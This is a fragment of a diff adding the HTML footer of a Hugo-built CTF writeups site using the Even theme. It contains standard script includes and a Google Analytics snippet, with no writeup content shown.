+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2023<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
